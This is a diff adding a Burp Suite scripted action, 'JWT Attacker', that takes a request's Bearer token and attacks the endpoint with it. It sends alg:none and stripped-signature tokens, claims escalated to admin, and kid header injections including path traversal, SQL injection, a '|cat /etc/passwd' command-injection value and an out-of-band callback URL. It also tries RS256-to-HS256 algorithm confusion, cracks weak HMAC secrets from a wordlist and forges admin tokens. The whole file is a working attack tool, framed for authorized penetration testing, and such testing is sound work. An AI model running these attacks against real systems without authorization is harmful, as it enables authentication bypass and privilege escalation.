@@ -1,0 +1,346 @@
+// JWT Attacker Bambda Custom Action by Sourav Banerjee
+// https://github.com/ns-sourav
+// Extracts a JSON Web Token from the Authorization: Bearer header and runs the
+// standard JWT tampering test-suite against the endpoint, then analyzes each
+// response against a baseline and routes results to the Organizer tab.
+//
+// Attack modules:
+//   - alg:none (case variants)
+//   - Signature stripping
+//   - Signature tampering (blank / flipped)
+//   - Claim tampering (exp bump + privilege escalation)
+//   - kid header injection (path traversal / SQLi / OOB)
+//   - Algorithm confusion RS256 -> HS256 (requires PUBLIC_KEY_PEM)
+//   - Weak-secret cracking (offline HMAC brute force)
+//
+// A tampered token that SHOULD be rejected but returns a baseline-like success
+// response is highlighted RED as a likely broken-verification finding.
+//
+// For authorized security testing, CTF and educational use only.
+
+// -------------------------- Configuration -------------------------- //
+
+// Delay between requests in milliseconds - 1000 = 1 second
+int GLOBAL_DELAY_MS = 200;
+
+// Burp Collaborator host or any host name like example.com (used for kid/OOB tests)
+String hostname = "<BURPCOLLABORATORHOST>";
+
+// If you already know the HMAC secret, set it here to forge validly-signed tokens
+String KNOWN_SECRET = "";
+
+// For RS256 -> HS256 algorithm confusion, paste the server's RSA public key (PEM)
+String PUBLIC_KEY_PEM = "";
+
+// Small wordlist used by the offline weak-secret cracker - add your own
+String[] SECRET_WORDLIST = {
+    "secret", "password", "123456", "changeme", "jwt", "key",
+    "admin", "test", "your-256-bit-secret", "supersecret",
+    "password123", "root", "qwerty", "jwtsecret", "s3cr3t"
+};
+
+// -------------------------- Token extraction (Authorization header only) -------------------------- //
+
+var originalRequest = requestResponse.request();
+var httpService = requestResponse.httpService();
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("JWT ATTACKER STARTED");
+logging.logToOutput("by Sourav Banerjee (https://github.com/ns-sourav)");
+logging.logToOutput("Target: " + httpService.host() + ":" + httpService.port());
+logging.logToOutput("[ ======================================= ]");
+
+String authHeader = originalRequest.headerValue("Authorization");
+if (authHeader == null || !authHeader.trim().toLowerCase().startsWith("bearer ")) {
+    logging.logToOutput("[!] No 'Authorization: Bearer <jwt>' header found. Nothing to test.");
+    return;
+}
+
+String jwt = authHeader.trim().substring("bearer ".length()).trim();
+
+if (!jwt.matches("eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*")) {
+    logging.logToOutput("[!] Authorization header value is not a JWT. Nothing to test.");
+    return;
+}
+
+// Split into the three base64url segments
+String[] parts = jwt.split("\\.", -1);
+if (parts.length < 2) {
+    logging.logToOutput("[!] Malformed JWT (need at least header and payload). Aborting.");
+    return;
+}
+String headerB64 = parts[0];
+String payloadB64 = parts[1];
+String originalSig = (parts.length >= 3) ? parts[2] : "";
+
+// Decode header and payload for logging / editing
+String headerJson;
+String payloadJson;
+try {
+    headerJson = new String(java.util.Base64.getUrlDecoder().decode(headerB64), java.nio.charset.StandardCharsets.UTF_8);
+    payloadJson = new String(java.util.Base64.getUrlDecoder().decode(payloadB64), java.nio.charset.StandardCharsets.UTF_8);
+} catch (Exception e) {
+    logging.logToOutput("[!] Failed to base64url-decode the JWT: " + e.getMessage());
+    return;
+}
+
+logging.logToOutput("[+] Decoded header : " + headerJson);
+logging.logToOutput("[+] Decoded payload: " + payloadJson);
+
+// Original algorithm from the header
+String origAlg = "";
+var algMatcher = java.util.regex.Pattern.compile("\"alg\"\\s*:\\s*\"([^\"]+)\"").matcher(headerJson);
+if (algMatcher.find()) { origAlg = algMatcher.group(1); }
+logging.logToOutput("[+] Algorithm      : " + (origAlg.isEmpty() ? "(unknown)" : origAlg));
+
+// Map the HMAC algorithm name used for signing/cracking
+String macAlg = "HmacSHA256";
+if (origAlg.equalsIgnoreCase("HS384")) macAlg = "HmacSHA384";
+else if (origAlg.equalsIgnoreCase("HS512")) macAlg = "HmacSHA512";
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
+logging.logToOutput("[ ======================================= ]");
+
+// -------------------------- Baseline (original, untampered token) -------------------------- //
+
+int baselineStatus;
+int baselineLength;
+try {
+    var baseResp = api.http().sendRequest(originalRequest);
+    baselineStatus = baseResp.response().statusCode();
+    baselineLength = baseResp.response().body().length();
+    baseResp.annotations().setNotes("JWT Attacker: Baseline (original token) -> Status: " + baselineStatus);
+    api.organizer().sendToOrganizer(baseResp);
+    logging.logToOutput("[+] Baseline -> Status: " + baselineStatus + ", Length: " + baselineLength);
+} catch (Exception e) {
+    logging.logToError("Error fetching baseline: " + e.getMessage());
+    return;
+}
+
+// -------------------------- Build tampered tokens -------------------------- //
+// Each entry is {label, token}. Every token here is one a secure server SHOULD reject.
+java.util.List<String[]> cases = new java.util.ArrayList<>();
+
+// Test 1: alg:none (case variants) - unsigned token, empty signature
+String[] noneVariants = {"none", "None", "NONE", "nOnE"};
+for (String variant : noneVariants) {
+    String noneHeader = "{\"alg\":\"" + variant + "\",\"typ\":\"JWT\"}";
+    String noneHeaderB64 = java.util.Base64.getUrlEncoder().withoutPadding()
+        .encodeToString(noneHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+    cases.add(new String[]{"alg:none (" + variant + ")", noneHeaderB64 + "." + payloadB64 + "."});
+}
+
+// Test 2: Signature stripping
+cases.add(new String[]{"Signature stripped (2 segments)", headerB64 + "." + payloadB64});
+cases.add(new String[]{"Signature stripped (trailing dot)", headerB64 + "." + payloadB64 + "."});
+
+// Test 3: Signature tampering
+cases.add(new String[]{"Blank signature (alg kept)", headerB64 + "." + payloadB64 + "."});
+if (!originalSig.isEmpty()) {
+    String flipped = new StringBuilder(originalSig).reverse().toString();
+    cases.add(new String[]{"Flipped signature", headerB64 + "." + payloadB64 + "." + flipped});
+}
+
+// Test 4: Claim tampering (exp/nbf + privilege escalation)
+// (a) Modify privilege claims that already exist in the token
+String editedPayload = payloadJson;
+editedPayload = editedPayload.replaceAll("\"exp\"\\s*:\\s*\\d+", "\"exp\":9999999999");
+editedPayload = editedPayload.replaceAll("\"nbf\"\\s*:\\s*\\d+", "\"nbf\":0");
+editedPayload = editedPayload.replaceAll("\"role\"\\s*:\\s*\"[^\"]*\"", "\"role\":\"admin\"");
+editedPayload = editedPayload.replaceAll("\"roles\"\\s*:\\s*\\[[^\\]]*\\]", "\"roles\":[\"admin\"]");
+editedPayload = editedPayload.replaceAll("\"isAdmin\"\\s*:\\s*(true|false)", "\"isAdmin\":true");
+editedPayload = editedPayload.replaceAll("\"is_admin\"\\s*:\\s*(true|false)", "\"is_admin\":true");
+editedPayload = editedPayload.replaceAll("\"admin\"\\s*:\\s*(true|false)", "\"admin\":true");
+editedPayload = editedPayload.replaceAll("\"administrator\"\\s*:\\s*(true|false)", "\"administrator\":true");
+editedPayload = editedPayload.replaceAll("\"user\"\\s*:\\s*\"[^\"]*\"", "\"user\":\"admin\"");
+boolean claimsChanged = !editedPayload.equals(payloadJson);
+
+// (b) Inject admin claims even when the token has none of them
+String injectedPayload = payloadJson.trim();
+if (injectedPayload.endsWith("}")) {
+    String inner = injectedPayload.substring(0, injectedPayload.length() - 1).trim();
+    String sep = inner.endsWith("{") ? "" : ",";
+    injectedPayload = inner + sep + "\"role\":\"admin\",\"admin\":true,\"isAdmin\":true}";
+}
+
+// Attack each tampered payload variant with blank / stale / re-signed signatures
+java.util.List<String[]> tamperVariants = new java.util.ArrayList<>();
+if (claimsChanged) { tamperVariants.add(new String[]{"escalated claims", editedPayload}); }
+tamperVariants.add(new String[]{"injected admin claims", injectedPayload});
+
+for (String[] tv : tamperVariants) {
+    String tvDesc = tv[0];
+    String tvB64 = java.util.Base64.getUrlEncoder().withoutPadding()
+        .encodeToString(tv[1].getBytes(java.nio.charset.StandardCharsets.UTF_8));
+    logging.logToOutput("[+] Claim tamper (" + tvDesc + "): " + tv[1]);
+    // Unsigned (blank sig) - detects servers that do not verify the signature
+    cases.add(new String[]{"Claim tampering - " + tvDesc + " (blank sig)", headerB64 + "." + tvB64 + "."});
+    // Keep the original (now-invalid) signature - some libraries ignore it
+    cases.add(new String[]{"Claim tampering - " + tvDesc + " (stale sig)", headerB64 + "." + tvB64 + "." + originalSig});
+    // Properly re-signed if a secret is known
+    if (!KNOWN_SECRET.isEmpty()) {
+        try {
+            String signingInput = headerB64 + "." + tvB64;
+            javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlg);
+            mac.init(new javax.crypto.spec.SecretKeySpec(KNOWN_SECRET.getBytes(java.nio.charset.StandardCharsets.UTF_8), macAlg));
+            String sig = java.util.Base64.getUrlEncoder().withoutPadding()
+                .encodeToString(mac.doFinal(signingInput.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+            cases.add(new String[]{"Claim tampering - " + tvDesc + " (re-signed with KNOWN_SECRET)", signingInput + "." + sig});
+        } catch (Exception e) {
+            logging.logToError("Error re-signing with KNOWN_SECRET: " + e.getMessage());
+        }
+    }
+}
+
+// Escalated payload used when forging with a cracked secret later
+String escalatedPayloadB64 = java.util.Base64.getUrlEncoder().withoutPadding()
+    .encodeToString((claimsChanged ? editedPayload : injectedPayload).getBytes(java.nio.charset.StandardCharsets.UTF_8));
+
+// Test 5: kid header injection
+String[] kidPayloads = {
+    "../../../../../../dev/null",
+    "../../../../../../etc/passwd",
+    "' OR '1'='1",
+    "1 UNION SELECT 'key'",
+    "http://" + hostname + "/",
+    "|cat /etc/passwd"
+};
+for (String kid : kidPayloads) {
+    String kidEscaped = kid.replace("\\", "\\\\").replace("\"", "\\\"");
+    String kidHeader = "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"" + kidEscaped + "\"}";
+    String kidHeaderB64 = java.util.Base64.getUrlEncoder().withoutPadding()
+        .encodeToString(kidHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+    cases.add(new String[]{"kid injection: " + kid, kidHeaderB64 + "." + payloadB64 + "." + originalSig});
+}
+
+// Test 6: Algorithm confusion (RS256 -> HS256)
+if (PUBLIC_KEY_PEM.isEmpty()) {
+    logging.logToOutput("[i] PUBLIC_KEY_PEM not set - skipping RS256->HS256 confusion test.");
+} else {
+    try {
+        String pem = PUBLIC_KEY_PEM
+            .replaceAll("-----BEGIN[^-]+-----", "")
+            .replaceAll("-----END[^-]+-----", "")
+            .replaceAll("\\s", "");
+        byte[] der = java.util.Base64.getDecoder().decode(pem);
+        String hs256Header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
+        String hs256HeaderB64 = java.util.Base64.getUrlEncoder().withoutPadding()
+            .encodeToString(hs256Header.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+        String signingInput = hs256HeaderB64 + "." + payloadB64;
+        javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
+        mac.init(new javax.crypto.spec.SecretKeySpec(der, "HmacSHA256"));
+        String sig = java.util.Base64.getUrlEncoder().withoutPadding()
+            .encodeToString(mac.doFinal(signingInput.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+        cases.add(new String[]{"Algorithm confusion RS256->HS256", signingInput + "." + sig});
+    } catch (Exception e) {
+        logging.logToError("Error with algorithm confusion: " + e.getMessage());
+    }
+}
+
+// -------------------------- Weak-secret cracking (offline, no requests) -------------------------- //
+logging.logToOutput("[ === Cracking HMAC secret offline === ]");
+
+String crackedSecret = null;
+boolean isHmac = origAlg.equalsIgnoreCase("HS256") || origAlg.equalsIgnoreCase("HS384") || origAlg.equalsIgnoreCase("HS512");
+if (!isHmac || originalSig.isEmpty()) {
+    logging.logToOutput("[i] Token is not HMAC-signed (alg=" + origAlg + ") - skipping secret cracking.");
+} else {
+    String signingInput = headerB64 + "." + payloadB64;
+    for (String secret : SECRET_WORDLIST) {
+        try {
+            javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlg);
+            mac.init(new javax.crypto.spec.SecretKeySpec(secret.getBytes(java.nio.charset.StandardCharsets.UTF_8), macAlg));
+            String candidate = java.util.Base64.getUrlEncoder().withoutPadding()
+                .encodeToString(mac.doFinal(signingInput.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+            if (candidate.equals(originalSig)) {
+                crackedSecret = secret;
+                break;
+            }
+        } catch (Exception e) {
+            logging.logToError("Error testing secret '" + secret + "': " + e.getMessage());
+        }
+    }
+
+    if (crackedSecret == null) {
+        logging.logToOutput("[-] Secret not found in wordlist.");
+    } else {
+        logging.logToOutput("[!] SECRET FOUND: '" + crackedSecret + "'");
+        // Forge an escalated token signed with the cracked secret and confirm acceptance
+        try {
+            String signingInput2 = headerB64 + "." + escalatedPayloadB64;
+            javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlg);
+            mac.init(new javax.crypto.spec.SecretKeySpec(crackedSecret.getBytes(java.nio.charset.StandardCharsets.UTF_8), macAlg));
+            String sig = java.util.Base64.getUrlEncoder().withoutPadding()
+                .encodeToString(mac.doFinal(signingInput2.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+            cases.add(new String[]{"Forged token signed with cracked secret '" + crackedSecret + "'", signingInput2 + "." + sig});
+        } catch (Exception e) {
+            logging.logToError("Error forging token with cracked secret: " + e.getMessage());
+        }
+    }
+}
+
+// -------------------------- Send every tampered token and analyze -------------------------- //
+int totalRequests = 0;
+int anomalies = 0;
+java.util.List<String> findings = new java.util.ArrayList<>();
+
+for (String[] testCase : cases) {
+    String label = testCase[0];
+    String token = testCase[1];
+    try {
+        var modifiedRequest = originalRequest.withHeader("Authorization", "Bearer " + token);
+        var response = api.http().sendRequest(modifiedRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+
+        int status = response.response().statusCode();
+        int length = response.response().body().length();
+
+        // A token that should be rejected but looks like the baseline success = likely broken verification
+        String verdict = "";
+        boolean baselineLike = (status == baselineStatus) && (Math.abs(length - baselineLength) <= 64);
+        var color = burp.api.montoya.core.HighlightColor.NONE;
+        if (baselineLike) {
+            verdict = " [LIKELY VULN]";
+            color = burp.api.montoya.core.HighlightColor.RED;
+            anomalies++;
+            findings.add("[RED] " + label + " (Status " + status + ")");
+        } else if (status != 401 && status != 403) {
+            verdict = " [ANOMALY]";
+            color = burp.api.montoya.core.HighlightColor.YELLOW;
+            anomalies++;
+            findings.add("[YELLOW] " + label + " (Status " + status + ")");
+        }
+
+        String note = label + " -> Status: " + status + " (Length: " + length + ")" + verdict;
+        logging.logToOutput("[ === " + note + " === ]");
+
+        var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
+        rr.annotations().setNotes(note);
+        if (color != burp.api.montoya.core.HighlightColor.NONE) {
+            rr.annotations().setHighlightColor(color);
+        }
+        api.organizer().sendToOrganizer(rr);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with " + label + ": " + e.getMessage());
+    }
+}
+
+// -------------------------- Summary -------------------------- //
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("[ === JWT ATTACKER DONE === ]");
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("Requests sent      : " + totalRequests);
+logging.logToOutput("Potential findings : " + anomalies + " (highlighted RED/YELLOW in Organizer)");
+logging.logToOutput("Secret cracked     : " + (crackedSecret == null ? "no" : "YES -> '" + crackedSecret + "'"));
+if (findings.isEmpty()) {
+    logging.logToOutput("No anomalies - every tampered token was rejected (401/403). Target looks secure.");
+} else {
+    logging.logToOutput("---------------- FLAGGED VARIANTS ----------------");
+    for (String f : findings) {
+        logging.logToOutput("  " + f);
+    }
+}
+logging.logToOutput("Check the Organizer tab for detailed results.");
+logging.logToOutput("[ ======================================= ]");
